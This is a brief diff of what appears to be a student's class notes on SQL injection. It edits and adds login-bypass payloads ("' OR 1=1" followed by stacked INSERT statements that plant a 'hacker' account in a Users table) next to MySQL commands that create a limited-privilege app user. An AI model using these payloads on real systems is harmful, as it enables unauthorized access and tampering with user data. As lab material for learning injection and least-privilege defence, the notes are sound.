@@ -26,10 +26,12 @@ admin' or 't'='t';insert into Users (username, password) values ('attacker','tes
 ' or 1=1; select * from Users;--
 
 
-a' OR 1=1; INSERT INTO Users values ('1111hacked', 'hacker', 'I hacked you'); -- this is a comment
+a' OR 1=1; INSERT INTO Users (username, password) values ('hacker', 'I hacked you'); -- this is a comment
 
 CREATE USER 'appuser'@'localhost' IDENTIFIED BY 'This is for Quiz 1';
 
 show Grants for 'appuser'@'localhost';
 
 GRANT SELECT, INSERT, UPDATE on Sessions.* to 'appuser'@'localhost';
+
+a' OR 1=1; INSERT INTO Users (username, password) values ('hacker', 'I hacked you'); -- asdasd
